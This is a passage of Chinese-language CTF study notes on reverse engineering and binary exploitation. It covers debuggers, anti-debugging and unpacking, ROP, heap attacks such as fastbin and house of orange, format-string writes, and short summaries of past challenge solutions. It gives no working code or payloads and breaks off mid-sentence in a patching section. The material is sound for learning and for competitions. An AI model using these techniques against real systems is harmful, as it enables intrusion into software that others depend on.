title="（一）主要方法"></a>（一）主要方法</h3><ol><li><strong>静态分析法</strong>：不执行代码，观察文件外部特性。包括文件类型分析（了解程序语言、编译器、加密情况）和静态反汇编、反编译（常用反汇编工具查看内部代码结构）。</li><li><strong>动态分析法</strong>：在程序执行过程中通过调试分析代码，获取内存状态等，常用调试器进行分析。</li></ol><h3 id="（二）汇编指令体系结构"><a href="#（二）汇编指令体系结构" class="headerlink" title="（二）汇编指令体系结构"></a>（二）汇编指令体系结构</h3><ol><li><strong>x86 指令体系</strong><ul><li><strong>寄存器组</strong>：通用寄存器（EAX、EBX 等）、指令指针寄存器（EIP）、状态标识寄存器（EFLAGS）、段寄存器（CS、DS 等）、特殊寄存器（DR0 - DR7）。</li><li><strong>汇编指令集</strong>：有 Intel 和 AT&amp;T 两种语法记法，常用 Intel 记法。包括数据传送类（MOV）、栈操作与函数调用（PUSH、POP、CALL、RET）、算数逻辑运算（add、sub 等）、控制转移指令（cmp、test、jmp 等）、特殊指令（int3、int 0x80）。</li><li><strong>x86 应用程序二进制接口</strong>：函数调用时参数从右向左入栈，call 指令压入返回地址，新函数中保存旧 ebp 并调整 esp 为局部变量预留空间。</li></ul></li><li><strong>x64 指令体系</strong><ul><li><strong>寄存器组</strong>：通用寄存器增加到 16 个（RAX、RBX 等）。</li><li><strong>系统调用指令</strong>：syscall/sysret 用于 Linux 64 位系统调用。</li><li><strong>x64 应用程序二进制接口</strong>：Microsoft’s x64 ABI 前 4 个参数通过寄存器传递，其余栈传，栈上预留意空间；SysV x64 ABI 前 6 个参数寄存器传，其余栈传，无预留空间，返回值均在 RAX 寄存器。</li></ul></li></ol><h2 id="二、逆向分析工具"><a href="#二、逆向分析工具" class="headerlink" title="二、逆向分析工具"></a>二、逆向分析工具</h2><h3 id="（一）反汇编和反编译工具-IDA-Pro"><a href="#（一）反汇编和反编译工具-IDA-Pro" class="headerlink" title="（一）反汇编和反编译工具 - IDA Pro"></a>（一）反汇编和反编译工具 - IDA Pro</h3><ol><li><strong>打开文件</strong>：通过 File→Open 选择目标程序，IDA 自动识别文件类型。</li><li><strong>主窗口介绍</strong><ul><li><strong>工具栏区域</strong>：包含常用工具对应图标，可显示或隐藏。</li><li><strong>导航带</strong>：呈现文件地址空间线性视图，不同颜色表示代码或数据，有当前位置指示符。</li><li><strong>函数窗口</strong>：显示所有函数，有符号程序显示真实函数名，无符号程序函数名以 sub_开头。</li><li><strong>数据显示窗口</strong>：有反汇编、反编译等窗口，可通过菜单打开。</li><li><strong>消息窗口</strong>：显示分析状态和错误消息。</li></ul></li><li><strong>基本使用</strong><ul><li><strong>函数修正</strong>：以 push ebp/rbp 开头地址可能是函数起始地址，若未识别可手动创建（右键 Create Function 或快捷键 P）以便反编译。</li><li><strong>指令修正</strong>：对识别错误的指令或数据，在相应地址用快捷键 D（数据）、C（代码）进行修正。</li><li><strong>数据修正</strong>：修改数据长度和类型，字符串未正确识别可用快捷键 A 转换。</li><li><strong>注释信息与重命名</strong>：右键 Rename 重命名变量或函数，快捷键“;”（反汇编窗口）、“/”（反编译窗口）添加注释，可开启自动注释。</li><li><strong>二进制程序的 patch</strong>：将多余字节改为 nop 指令（Edit→Patch program→Change byte）使函数能正常反编译。</li><li><strong>交叉引用</strong>：代码交叉引用表示指令控制权转移，数据交叉引用追踪数据访问方式。</li></ul></li></ol><h3 id="（二）调试器"><a href="#（二）调试器" class="headerlink" title="（二）调试器"></a>（二）调试器</h3><ol><li><strong>Ollydbg</strong><ul><li><strong>主界面</strong>：反汇编窗口显示反汇编源代码；信息窗口显示寄存器、API 调用等信息；数据窗口以十六进制显示内存数据；寄存器窗口动态显示寄存器内容；堆栈窗口显示堆栈情况；命令行用于输入调试命令。</li><li><strong>断点操作</strong><ul><li><strong>一般断点</strong>：用 INT3 指令替换断点地址首字节，可按 F2 键或在命令行用 bp 命令设置/取消。</li><li><strong>内存断点</strong>：分为访问和写入断点，OD 同一时刻仅允许一个。在数据窗口选择内存数据右键设置，用于跟踪关键数据使用和生成情况。</li><li><strong>硬件断点</strong>：不修改代码，有访问、写入、执行三种类型，最多设 4 个，设置方法与内存断点类似。</li></ul></li><li><strong>代码跟踪操作</strong>：F9 运行程序；F7 单步跟踪（步入）；F8 单步跟踪（步过）；F4 执行到所选代码；ALT + F9 执行到程序领空。</li></ul></li><li><strong>gdb</strong><ul><li><strong>安装</strong>：多数 Linux 发行版默认安装，否则可在 Ubuntu 下用 apt - get 安装，调试其他架构 elf 程序可安装 gdb - multiarch，还有 peda、gef、pwndbg 等插件可增强功能。</li><li><strong>基本调试操作</strong>：包括启动结束（如 gdb [可执行文件]、quit）、通用命令（如 help、list）、断点操作（如 break、delete）、运行调试目标（如 run、continue）、查看修改程序状态（如 print、set）等，各有其命令格式和功能。</li></ul></li></ol><h3 id="（三）Trace-类工具-Qira"><a href="#（三）Trace-类工具-Qira" class="headerlink" title="（三）Trace 类工具 - Qira"></a>（三）Trace 类工具 - Qira</h3><p>由 geohot 开发，安装后运行 qira - s [程序名] 可在 4000 端口开启服务，同时开启 3002 Web 端口。浏览器 Web 界面可查看程序运行信息，如指令、寄存器、内存、系统调用等。</p><h2 id="三、Reverse-分析流程"><a href="#三、Reverse-分析流程" class="headerlink" title="三、Reverse 分析流程"></a>三、Reverse 分析流程</h2><h3 id="（一）常规逆向分析流程"><a href="#（一）常规逆向分析流程" class="headerlink" title="（一）常规逆向分析流程"></a>（一）常规逆向分析流程</h3><ol><li><strong>关键代码定位</strong><ul><li><strong>API 断点法</strong>：在 GetWindowText、GetDlgItemText（获取文本输入）和 MessageBox（输出结果）等 API 函数下断点，通过栈回溯定位关键代码。</li><li><strong>字符串检索法</strong>：在 IDA 中用 Strings 子窗口和 Ctrl + F 查找字符串；在 OD 中通过 Alt + E 找到主模块，右键选择搜索引擎查找字符串。</li><li><strong>辅助工具定位法</strong>：针对特定语言或编译器程序，如 xspy（MFC 程序）、Dede（Delphi 程序）等可定位按键处理程序地址。</li></ul></li><li><strong>常见加密算法识别</strong><ul><li><strong>base64</strong>：将输入每 3 字节按 6 比特分组转换为 4 个可见字符，若代码引用特定索引表“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/”或其变种索引表，可确定使用该算法。</li><li><strong>TEA</strong>：分组加密算法，密钥 128 比特，明文 64 比特，32 轮变换，有固定常数 0x9e3779b9 或 0x61c88647 可辅助识别。</li><li><strong>AES</strong>：常见分组加密算法，涉及字节替代（通过 S 盒）、行移位、列混淆和轮密钥加等操作，若发现 S 盒或动态生成 S 盒可确定。</li><li><strong>RC4</strong>：流加密算法，初始化对字符数组 s 递增赋值并交换 256 次，可据此识别。</li><li><strong>MD5</strong>：产生 128 位散列值，若看到 0x67452301、0xefcdab89、0x98badcfe、0x10325476 这 4 个常数可怀疑是 MD5 算法。</li></ul></li><li><strong>求解 flag</strong><ul><li><strong>直接内存获取</strong>：在比较处下断点查看内存获取 flag，如 2015 年 9447CTF 的 the - real - flag - finder 程序在调用 memcmp 处断点，RDI 寄存器指向 flag。</li><li><strong>对算法进行逆变换操作</strong>：分析判断过程代码中的算法，编写逆算法求解，如 base64 编码程序先分析 change 函数确定为变种 base64，再进行逆变换。</li><li><strong>线性变换的求解</strong>：若 convert 是线性变换，通过单字符爆破获取 flag，如某国内 CTF 比赛 cipher 程序根据输入输出关系确定为线性变换后进行爆破。</li><li><strong>约束求解</strong>：当 output = convert(input)需满足多个约束条件时，用 z3 等约束求解器，如某程序中对输入变换后有多个条件限制，采用约束求解得到 flag。</li></ul></li></ol><h3 id="（二）自动化逆向"><a href="#（二）自动化逆向" class="headerlink" title="（二）自动化逆向"></a>（二）自动化逆向</h3><ol><li><strong>IDAPython</strong>：可通过 Python 脚本访问 IDA 相关 API，默认安装的 IDA 已内置，在菜单栏选择 File→Script file 运行脚本，主要接口在 idaapi、idautils 和 idc 模块，可用于如数据异或解密等操作。</li><li><strong>PythonGdb</strong>：能编写 gdb 调试脚本，可包装断点（如 OnBreakpoint 类在指定位置下断点并执行回调函数）、寄存器和内存操作（如 get_reg、set_reg、read_mem、write_mem 等函数）等功能。</li><li><strong>pydbg</strong>：基于 Python 的 Windows 调试器框架，可通过 bp_set 设置断点并添加处理函数实现自动化调试。</li><li><strong>Angr</strong>：强大的二进制分析工具，用动态符号执行解 flag。步骤包括加载程序（设置 auto_load_libs 为 false）、建立初始化状态（可符号化输入）、探索路径（指定 find 和 avoid 地址）、通过约束求解器获取 flag。</li></ol><h3 id="（三）干扰分析技术及破解方法"><a href="#（三）干扰分析技术及破解方法" class="headerlink" title="（三）干扰分析技术及破解方法"></a>（三）干扰分析技术及破解方法</h3><ol><li><strong>花指令</strong><ul><li><strong>基本思路</strong>：影响静态分析，在 IDA 中使指令或函数无法识别，可手动 patch 为 nop 指令或编写脚本自动化处理。</li><li><strong>实例分析</strong>：如某程序在 4010dd 处插入无用字节影响反汇编，分析指令模式后编写 IDAPython 脚本去除花指令。</li></ul></li><li><strong>反调试</strong><ul><li><strong>Linux 下常见方法</strong>：利用 ptrace 系统调用（进程被跟踪后再次调用 ptrace(PTRACE_TRACEM)会失败）；proc 文件系统检测（如 /proc/self/status 中 TracerPid 在调试和非调试状态不同）；父进程检测（通过 getppid 系统调用判断父进程是否为调试器）。</li><li><strong>基本思路</strong>：定位反调试代码并 patch 跳过检测。</li><li><strong>实例分析</strong>：defcamp quals 2015 的 r100.bin 程序在.init_array 中的函数通过 ptrace 检查调试器，对其 patch 可跳过检查。</li></ul></li><li><strong>加壳</strong><ul><li><strong>基本思路</strong>：CTF 中多为已知壳，可用专用工具或脚本脱壳，如 UPX 壳用“upx–d”命令。</li><li><strong>实例分析</strong>：2014 ISCC 逆向题，用 PEiD 查壳为 ASProtect 壳，找到脱壳脚本在 OD 中运行，修复 OEP 和 IAT 后脱壳成功。</li></ul></li><li><strong>控制流混淆</strong><ul><li><strong>基本思路</strong>：采用 Trace 方法记录指令后进行数据流分析，可用 Ptrace 单步执行或 Pin 等动态二进制插桩工具记录。</li><li><strong>实例分析</strong>：20150CTF 的 r0ops 程序控制流混淆，用 Pin 记录指令，IDAPython 脚本处理后分析得到数据处理过程并求解 flag。</li></ul></li><li><strong>双进程保护</strong><ul><li><strong>基本思路</strong>：分析父进程处理子进程逻辑，对子进程 patch 使其脱离主进程后正常运行，再分析子进程算法。</li><li><strong>实例分析</strong>：2016 alictf 的 debug 程序，通过互斥体区分父子进程，分析父进程处理函数后对子进程 patch，修改 main 函数后调试子进程并解密得到 flag。</li></ul></li><li><strong>虚拟机保护</strong><ul><li><strong>基本思路</strong>：逆向虚拟机得到 ISA，编写反汇编工具分析反汇编代码。</li><li><strong>实例分析</strong>：2015 zctf simulator 程序，分析 main 函数和 vm 相关函数得到虚拟机寄存器和指令集，编写反汇编工具后分析程序。</li></ul></li></ol><h3 id="（四）脚本语言的逆向"><a href="#（四）脚本语言的逆向" class="headerlink" title="（四）脚本语言的逆向"></a>（四）脚本语言的逆向</h3><ol><li><strong>.NET 程序逆向</strong><ul><li><strong>识别</strong>：用 PEiD 识别为 Microsoft Visual C#/Basic.NET，IDA 打开时有 Microsoft.NET assembly 选项。</li><li><strong>反编译</strong>：用.NET Reflector 打开程序分析，可找到 Main 函数查看代码逻辑。</li><li><strong>反混淆</strong>：de4dot 工具可对混淆后的.NET 程序反混淆，便于分析。</li></ul></li><li><strong>Python 程序逆向</strong><ul><li><strong>识别</strong>：IDA 打开查看字符串，有 PY2EXE_VERBOSE 和较多以 Py 开头字符串可能是 py2exe 打包，pyInstaller 打包程序也有类似特征。</li><li><strong>字节码文件提取</strong>：py2exe 打包程序用提取脚本（<a target="_blank" rel="noopener" href="https://github.com/matiasb/unpy2exe），pyInstaller">https://github.com/matiasb/unpy2exe），pyInstaller</a> 打包程序用提取脚本（<a target="_blank" rel="noopener" href="https://github.com/Ravensss/pyinstxtractor），有时需手动添加">https://github.com/Ravensss/pyinstxtractor），有时需手动添加</a> pyc 文件头。</li><li><strong>字节码文件反编译</strong>：用 uncompyle2 工具安装后将 pyc 文件反编译为 Python 源代码分析。</li></ul></li><li><strong>Java 程序逆向</strong><ul><li><strong>识别</strong>：未安装 JDK 或 JRE 运行报错，IDA 查看字符串有 java 相关信息可识别。</li><li><strong>Jar 包提取</strong>：exe4j 打包程序运行时 Jar 包在系统临时目录，可搜索获取。</li><li><strong>Jar 包反编译</strong>：用 jad、jd - gui、Fernflower 等工具反编译 Jar 包。</li></ul></li></ol><h1 id="PWN笔记"><a href="#PWN笔记" class="headerlink" title="PWN笔记"></a>PWN笔记</h1><h2 id="一、PWN基础"><a href="#一、PWN基础" class="headerlink" title="一、PWN基础"></a>一、PWN基础</h2><h3 id="（一）基本工具"><a href="#（一）基本工具" class="headerlink" title="（一）基本工具"></a>（一）基本工具</h3><ol><li><strong>逆向辅助类</strong><ul><li><strong>IDA Pro</strong>：强大的反汇编工具，其反编译插件能将代码还原到接近源码水平，操作复杂，可参考《IDA Pro权威指南》。</li><li><strong>gdb</strong>：功能强大的程序调试工具，是动态调试必备。其插件 peda 拓展了可视化和功能，原版不支持 Python3，有扩展版本可兼容。类似插件还有 pwngdb、GEF 等，部分可用于查看堆链表状态。</li></ul></li><li><strong>漏洞利用类</strong><ul><li><strong>pwntools</strong>：CTF 框架和漏洞利用开发库，模块丰富，方便开发 exploit。</li><li><strong>zio</strong>：蓝莲花队员开发，使用简单。</li><li><strong>Ropgadget</strong>：用于找寻程序中组装rop链的gadget，支持多种架构。</li><li><strong>checksec</strong>：查询程序保护机制开启情况，在 peda 中也有此功能。</li><li><strong>one_gadget</strong>：分析定位 libc 中获取 shell 的 magic 地址。</li><li><strong>seccomp-tools</strong>：分析程序 seccomp 安全机制开启情况。</li></ul></li></ol><h3 id="（二）保护机制"><a href="#（二）保护机制" class="headerlink" title="（二）保护机制"></a>（二）保护机制</h3><ol><li><strong>NX（数据执行保护）</strong>：防止程序在非可执行内存区执行指令，在 80x86 体系中通过页面表存储方式实现，最后一位为 NX 位，0 允许执行，1 禁止。gcc 默认开启不可执行栈功能，可通过 -z execstack 关闭。</li><li><strong>ASLR（地址空间随机化）</strong>：/proc/sys/kernel/randomize_va_space 控制，root 可修改。0 关闭；1 使 mmap base、stack、vdso page 随机化，.so 文件和部分可执行程序代码段加载地址随机，heap 可能不随机；2 在此基础上增加 heap 随机化。</li><li><strong>PIE（代码段随机化）</strong>：类似 ASLR，与 ASLR 中代码段随机化相关。</li><li><strong>RELRO</strong>：分为 partial relro 和 full relro，前者重定位信息（如 got 表）可写，后者不可写。</li><li><strong>STACK CANARY</strong>：栈溢出保护，gcc 编译默认开启，-fno-stack-protector 可关闭。</li></ol><h3 id="（三）PWN-类型"><a href="#（三）PWN-类型" class="headerlink" title="（三）PWN 类型"></a>（三）PWN 类型</h3><p>包括栈漏洞、堆漏洞、格式化字符串漏洞、整型漏洞、逻辑漏洞等。栈、格式化字符串、整型漏洞相对较易，堆和逻辑漏洞较难。前几种侧重基本功，逻辑漏洞侧重思维能力，且漏洞常相互结合。</p><h3 id="（四）常见利用方法"><a href="#（四）常见利用方法" class="headerlink" title="（四）常见利用方法"></a>（四）常见利用方法</h3><ol><li><strong>shellcode</strong>：获取 shell 的代码。针对数据区未开启 NX，可布置在堆栈等可写可执行区域并劫持控制流。也可通过 rop 等手段关闭 NX 或修改代码页属性来执行。可利用 pwntools 的 shellcraft 模块生成。</li><li><strong>rop（返回地址导向编程）</strong>：利用动态链接库和可执行文件中以 ret 结尾的指令片段（gadget），在程序开启 NX 但可控制栈数据时，通过控制栈上返回地址构造控制流。有 ret2libc 等形式，其构造与函数栈参数传递规则相关。</li><li><strong>Magic_Addr（One_gadget）</strong>：通过 libc 中 system 函数实现代码里的特定地址获取 shell，需调试，可使用 one_gadget 工具定位。</li><li><strong>Return-to-dl_resolve</strong>：在未提供 libc 库、未开启 PIE 或 FULL RELRO 时，利用_dl_runtime_resolve 函数解析 system 函数地址。需用到 elf 结构动态节信息，如 SYMTAB、STRTAB、JMPREL、VERSYM，通过控制程序向 bss 区域写内容伪造相关结构来实现。</li></ol><h3 id="（五）程序内存布局"><a href="#（五）程序内存布局" class="headerlink" title="（五）程序内存布局"></a>（五）程序内存布局</h3><p>程序启动加载数据到内存，运行中开辟动态内存。主要包括程序数据（含代码段、数据段、BSS 段）、堆、库数据、栈，还有内核空间（CTF 较少涉及）。程序数据在低地址，依次为堆、库数据、栈，各部分有其存储特点和作用。</p><h2 id="二、栈相关漏洞"><a href="#二、栈相关漏洞" class="headerlink" title="二、栈相关漏洞"></a>二、栈相关漏洞</h2><h3 id="（一）栈介绍"><a href="#（一）栈介绍" class="headerlink" title="（一）栈介绍"></a>（一）栈介绍</h3><p>程序栈存储局部信息，动态增长，由函数栈划分。函数栈存储临时变量、函数返回栈基址（bp）、函数返回地址（ip）等。函数调用时参数入栈，压入返回地址和 bp（可能），函数结束时恢复栈指针并弹出相关值，bp 和 ip 对控制流有重要影响。</p><h3 id="（二）栈溢出"><a href="#（二）栈溢出" class="headerlink" title="（二）栈溢出"></a>（二）栈溢出</h3><ol><li><strong>基本概念</strong>：栈上缓冲区数据超出边界，覆盖原有数据。重要数据如局部变量、bp、ip 被覆盖会影响控制流，可用于改变程序执行逻辑或构造漏洞利用条件。</li><li><strong>覆盖栈缓冲区的具体用途</strong><ul><li>涉及数据不可执行（NX/DEP）和栈保护哨（canary），NX 防止在缓冲区存放可执行代码，canary 防止栈溢出覆盖 bp 和 ip，可通过特定编译选项开启或关闭。</li><li>覆盖返回地址可劫持控制流，改变程序执行路径。</li><li>覆盖临时变量可能影响程序逻辑判断和执行。</li><li>覆盖栈底寄存器 bp 可实现栈转移或改变参数索引。</li><li>关注敏感函数，如 gets、scanf 等可能导致栈溢出的函数。</li></ul></li></ol><h3 id="（三）栈的特殊利用"><a href="#（三）栈的特殊利用" class="headerlink" title="（三）栈的特殊利用"></a>（三）栈的特殊利用</h3><p>包括 libc 信息泄露（利用 main 函数栈底的__libc_start_main_ret 泄露信息计算相关地址）、多级指针（利用函数栈下的环境变量等指针泄露信息，常用于格式化字符串漏洞）、环境变量修改（通过修改栈上的环境变量指针参数影响程序行为）、通过 libc 泄露栈地址（根据 libc 中的 Environ 偏移计算栈偏移）、往栈上写 rop 的技巧（在合适位置写入 rop 并通过返回触发）。</p><h3 id="（四）栈喷射"><a href="#（四）栈喷射" class="headerlink" title="（四）栈喷射"></a>（四）栈喷射</h3><p>用于无法确定栈地址时，在栈中预先布置大量重复性 rop 数据块，增加栈转移后跳入 rop 位置的概率，通常是在栈地址部分位不确定时，布置相关地址空间的数据。</p><h3 id="（五）线程栈"><a href="#（五）线程栈" class="headerlink" title="（五）线程栈"></a>（五）线程栈</h3><p>同一进程不同线程栈在程序栈中，相互隔离但可能发生溢出覆盖。CTF 赛题中有大范围写改写其他线程栈数据和递归耗尽线程栈空间并触发读写两种攻击模式，通过相应示例展示了其原理和利用方式。</p><h3 id="（六）真题解析"><a href="#（六）真题解析" class="headerlink" title="（六）真题解析"></a>（六）真题解析</h3><ol><li><strong>{ZCTF - 2015}guess(PWN100)</strong>：gets 缓冲区在栈上且可任意长度读入，栈缓冲区长度有限。利用栈中 argv[0]地址覆盖实现任意地址泄露，结合异或操作获取 flag。</li><li><strong>{ZCTF - 2015}spell(PWN300)</strong>：读取用户数据与驱动数据对比，存在读取长度溢出漏洞。通过控制输入长度和数据，覆盖相关指令代码，利用时间信息构造合适输入获取 flag。</li><li><strong>{Codegate - 2015}Chess(PWN700)</strong>：程序开启 PIE，是象棋类游戏逻辑。通过分析检测机制和栈信息，利用棋子移动覆盖ebp和修改相关参数泄露信息，再通过栈喷射构造 Payload 获取 shell。</li><li><strong>{RCTF - 2015}Welpwn(PWN200)</strong>：栈溢出且 0 字符截断，通过覆盖 rbp 最低字节实现栈转移，利用栈喷射确保跳入ROP位置获取 shell。</li></ol><h2 id="三、堆相关漏洞"><a href="#三、堆相关漏洞" class="headerlink" title="三、堆相关漏洞"></a>三、堆相关漏洞</h2><h3 id="（一）堆介绍"><a href="#（一）堆介绍" class="headerlink" title="（一）堆介绍"></a>（一）堆介绍</h3><p>堆是用户动态申请的内存，CTF 中多基于 Linux 的 ptmalloc2 - glibc 堆块管理机制。主要数据结构有 chunk（包括 alloced chunk、free chunk、top chunk 等）和 bin（如 fast bin、unsorted bin、small bin、large bin 等），以及 tcache（新机制，类似 fast bin，有特定管理结构和函数）。malloc 和 free 有其规则，涉及内存对齐、块大小检查、合并等操作。</p><h3 id="（二）漏洞类型"><a href="#（二）漏洞类型" class="headerlink" title="（二）漏洞类型"></a>（二）漏洞类型</h3><ol><li><strong>最基本的堆漏洞</strong>：因对堆内容类型判断不明，结构体数据解析错误导致，可通过在特定域布置数据劫持控制流或实现数据读写。</li><li><strong>堆缓冲区溢出</strong><ul><li>常规堆溢出包括覆盖本堆块内部数据和后续堆块数据，利用方式与栈溢出类似或根据堆结构破坏情况利用。</li><li>Off By One 是堆块末尾溢出 1 字节，可覆盖下一堆块 size 域最低位，利用有特定套路。</li></ul></li><li><strong>Use After Free（UAF）</strong>：堆指针释放后未置空，访问时可访问原内容，可用于信息泄露和修改。</li><li><strong>Double Free</strong>：多次释放指针，使堆块重叠，可转换为基本堆问题或构造特殊堆结构利用。</li></ol><h3 id="（三）利用方法"><a href="#（三）利用方法" class="headerlink" title="（三）利用方法"></a>（三）利用方法</h3><ol><li><strong>最基本的堆利用</strong>：针对基本漏洞和部分缓冲区覆盖，如通过类型转换利用结构体中函数指针实现控制流劫持。</li><li><strong>unlink</strong>：新式 unlink 有诸多限制，可通过特定方式伪造堆块满足条件，实现任意地址读写，如 freenote 题目中的利用方式。</li><li><strong>fastbin attack</strong>：利用 fastbin 机制，通过改写 fd 域控制分配堆块，需满足存在相关漏洞和对目标地址 size 域设置等条件。</li><li><strong>forgotten chunk</strong>：利用堆块申请释放中的遗忘部分构造重叠堆块，可进行堆扩展（往后或往前合并）、堆收缩等操作，结合其他利用方法进一步利用。</li><li><strong>house of force</strong>：溢出覆盖 top chunk 的 size 域为大值，申请大块内存使 top chunk 头部落到目标地址，实现泄露和改写，常用于修改 libc 中的 hook 等数据。</li><li><strong>house of spirit</strong>：在堆上构造 fastbin 结构，改写前一堆块指针使下次申请到栈上，需泄露栈地址并满足 fastbin attack 条件。</li><li><strong>house of orange</strong>：利用 Unsorted bin Attack 和 FSOP，通过控制 unsorted bin 链表和_IO_FILE 结构体链表获取 shell，不同 glibc 版本有不同利用细节和限制。</li><li><strong>堆喷射</strong>：在堆块中布置大量重复数据便于索引，CTF 赛题中较少见，在真实漏洞利用较多，有特定保护机制和利用场景。</li><li><strong>更多堆利用技巧</strong>：如堆地址碰撞，利用 x86 堆地址空间有限和按页对齐特点，在无法泄露堆地址时通过调试值进行碰撞利用。</li></ol><h3 id="（四）真题解析"><a href="#（四）真题解析" class="headerlink" title="（四）真题解析"></a>（四）真题解析</h3><ol><li><strong>{ZCTF - 2015}note1(PWN200)</strong>：菜单式交互程序，edit 时缓冲区溢出，利用结构体指针泄露和改写 got 表获取 shell。</li><li><strong>{ZCTF - 2015}note2(PWN400)</strong>：菜单式程序，edit 时 append 越界，采用 fastbin 方式构造假堆块，释放后改写全局指针获取 shell。</li><li><strong>{hack.lu - 2014}oreo(PWN400)</strong>：订单系统，添加订单时 name 和 description 长度溢出，利用 fastbin 和留言功能，通过控制订单表指针泄露信息和构造假节点改写 got 表获取 shell。</li><li><strong>{RCTF - 2015}Shaxian(PWN400)</strong>：堆溢出覆盖 next 指针泄露 got 表内容，采用 fastbin 利用方法改写 atoi_got 为 system，因 libc 问题采用暴力破解偏移获取 shell。</li><li><strong>{XMAN 夏令营练习题}levev6_x86(freenote - x86)</strong>：32 位程序，利用 unlink 方法构造堆块满足条件，泄露 libc 地址后改写 got 表获取 shell。</li><li><strong>{XMAN 夏令营练习题}levev6 - x64(freenote - x64)</strong>：64 位程序，类似 x86 版本利用 unlink 方法获取 shell。</li><li><strong>{house of orange(2016 - hitcon)}</strong>：在不同 glibc 版本下利用 Unsorted bin Attack 和 FSOP 技术，通过构造特定数据结构和利用函数漏洞获取 shell，高版本有更多限制和不同利用方式。</li></ol><h2 id="四、格式化字符串漏洞"><a href="#四、格式化字符串漏洞" class="headerlink" title="四、格式化字符串漏洞"></a>四、格式化字符串漏洞</h2><h3 id="（一）基本概念"><a href="#（一）基本概念" class="headerlink" title="（一）基本概念"></a>（一）基本概念</h3><p>针对 printf、sprintf 等格式化函数，利用格式化字符串中的格式说明符（如%x、%p、%s、%n 等）和变参列表工作。%n 可用于写入数据，通过控制格式化字符串可实现信息泄露和修改，参数定位有正常顺序和特殊的%d$m 形式。</p><h3 id="（二）信息泄露与修改"><a href="#（二）信息泄露与修改" class="headerlink" title="（二）信息泄露与修改"></a>（二）信息泄露与修改</h3><ol><li><strong>原理</strong>：格式化函数为变长参数函数，参数按栈传递规则寻找，实际参数不足时会引发漏洞，可利用其参数转换显示和写入功能。</li><li><strong>信息泄露</strong>：通过参数转换显示功能，利用格式化字符串查看栈上数据，x86 和 x64 程序可通过控制栈数据或利用寄存器实现任意地址泄露，如在栈上布置数据并通过特定格式说明符索引显示。</li><li><strong>信息修改</strong>：利用%n 写入数据，可通过%hn、%hhn 控制写入宽度，结合%c 写入特定值，通过控制格式化字符串和地址布置实现任意地址写，修改全局变量等改变程序逻辑。</li></ol><h3 id="（三）额外技巧"><a href="#（三）额外技巧" class="headerlink" title="（三）额外技巧"></a>（三）额外技巧</h3><ol><li><strong>无法存放或索引到目的地址</strong>：通过 path 二级指针进行格式化利用，在栈或堆上控制空间不足时，利用多级指针修改链实现任意地址写，如通过修改 path 指针指向的地址内容逐步达到目标地址修改。</li><li><strong>只有单次格式化机会</strong>：通过改写特定函数（如返回地址、got 表地址、函数指针等）实现多次格式化，构造循环逻辑满足多次利用需求。</li><li><strong>将其他漏洞转换为格式化漏洞</strong>：当其他漏洞功能有限时，将可写地址改写成 printf 函数，利用格式化漏洞强大功能实现更多信息泄露和地址改写。</li></ol><h3 id="（四）真题解析-1"><a href="#（四）真题解析-1" class="headerlink" title="（四）真题解析"></a>（四）真题解析</h3><ol><li><strong>{CCTF - 2016}PWN3(PWN350)</strong>：格式化字符串在栈上，利用漏洞泄露 malloc 地址计算 libc 基址和 system 地址，通过构造格式化字符串改写 puts_got 为 system 地址获取 shell。</li><li><strong>{RCTF - 2015}nobug(PWN300)</strong>：函数返回处有格式化字符串且可无限次使用，通过 argv、argv0 和 path 指针关系实现任意地址改写，获取 shell。</li><li><strong>{LCTF - 2016}PWN200</strong>：读取溢出覆盖指针后利用 strcpy 实现任意地址写，先将 free 改写成 printf 泄露信息，再布置地址改写为 system 地址获取 shell。</li></ol><h2 id="五、整型漏洞"><a href="#五、整型漏洞" class="headerlink" title="五、整型漏洞"></a>五、整型漏洞</h2><h3 id="（一）宽度溢出"><a href="#（一）宽度溢出" class="headerlink" title="（一）宽度溢出"></a>（一）宽度溢出</h3><p>整型数据存储有宽度限制，超出宽度产生溢出。存储模式有大端和小端，一般采用小端模式。通过示例展示了整型数据运算和赋值时宽度溢出情况，如将宽字节整型数据存储到窄字节数据中导致数据截断。</p><h3 id="（二）符号转换"><a href="#（二）符号转换" class="headerlink" title="（二）符号转换"></a>（二）符号转换</h3><p>有符号数与无符号数转换因最高位表示不同易产生漏洞。有符号数正数补码与原码相同，负数补码需按规则计算。在条件判断和参数传递中，因符号转换可能导致逻辑错误，如无符号数与有符号数强制转换后绕过条件判断或函数参数类型不匹配。</p><h3 id="（三）数组越界"><a href="#（三）数组越界" class="headerlink" title="（三）数组越界"></a>（三）数组越界</h3><p>因数组索引检查不严格，超出预设范围访问数据，可实现信息泄露和数据篡改。通过示例展示了数组越界访问栈上数据的情况，输入超出范围的索引可打印或修改其他数据。</p><h3 id="（四）真题解析-2"><a href="#（四）真题解析-2" class="headerlink" title="（四）真题解析"></a>（四）真题解析</h3><p><strong>{ZCTF - 2015}note3(PWN300)</strong>：edit 中 id 转换存在整型数据溢出，导致索引错误覆盖堆块，利用 unlink 构造假堆块改写全局指针获取 shell。</p><h2 id="六、逻辑漏洞"><a href="#六、逻辑漏洞" class="headerlink" title="六、逻辑漏洞"></a>六、逻辑漏洞</h2><h3 id="（一）基本概念-1"><a href="#（一）基本概念-1" class="headerlink" title="（一）基本概念"></a>（一）基本概念</h3><p>程序逻辑问题，如不严密或复杂导致分支处理错误，在 Web 和 Crypto 中常见，PWN 题目中较少且多为竞态条件漏洞。</p><h3 id="（二）竞态条件漏洞"><a href="#（二）竞态条件漏洞" class="headerlink" title="（二）竞态条件漏洞"></a>（二）竞态条件漏洞</h3><p>多任务访问同一资源时因访问顺序不同产生冲突，如 TOCTTOU 漏洞是检查和使用时间不一致，导致权限/状态检查绕过，通过示例展示了线程间资源竞争和文件操作中权限绕过的情况。</p><h3 id="（三）真题解析"><a href="#（三）真题解析" class="headerlink" title="（三）真题解析"></a>（三）真题解析</h3><p><strong>{exploit - exercises}nebula level10</strong>：分析代码中 access 与 open 函数非原子操作，通过循环软连接文件绕过 access 检查，实现对特定文件的读取和发送，获取 flag。</p><h2 id="七、Attack-amp-Defense-模式"><a href="#七、Attack-amp-Defense-模式" class="headerlink" title="七、Attack&amp;Defense 模式"></a>七、Attack&amp;Defense 模式</h2><h3 id="（一）修补方案"><a href="#（一）修补方案" class="headerlink" title="（一）修补方案"></a>（一）修补方案</h3><ol><li><strong>大小修改法</strong>：在栈或堆溢出场景，修改分配、读取、复制内存大小防止溢出，如修改 read 函数读取大小修补栈溢出漏洞，利用 IDA 的 keypatch 插件操作。</li><li><strong>函数替换法</strong>：对于格式化字符串漏洞等，将有漏洞函数（如 